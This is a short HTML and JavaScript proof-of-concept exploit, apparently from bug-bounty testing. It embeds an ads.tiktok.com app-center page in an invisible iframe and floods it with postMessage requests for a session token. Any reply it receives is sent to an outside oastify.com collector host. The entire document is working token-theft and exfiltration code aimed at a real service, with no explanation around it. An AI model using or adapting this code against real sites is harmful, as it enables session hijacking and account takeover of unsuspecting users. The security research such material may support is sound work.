<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>

<script>
    const targetOrigin = "https://ads.tiktok.com";

    document.getElementById('victim').onload = function() {
        const victimWindow = this.contentWindow;

        // Spam postMessage every 1s to ensure hitting dynamic listeners
        setInterval(() => {
            try {
                victimWindow.postMessage({ action: "getSessionToken" }, targetOrigin);
            } catch (e) {
                console.warn("PostMessage failed:", e);
            }
        }, 1000);
    };

    window.addEventListener('message', (e) => {
        if (e.origin === targetOrigin && e.data) {
            console.log("ðŸŽ¯ GOT TOKEN:", e.data);

            fetch('https://at7v3ys22asv8q8n1p8e0ylpjgp7dy1n.oastify.com/collect', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ token: e.data })
            });
        }
    });
</script>
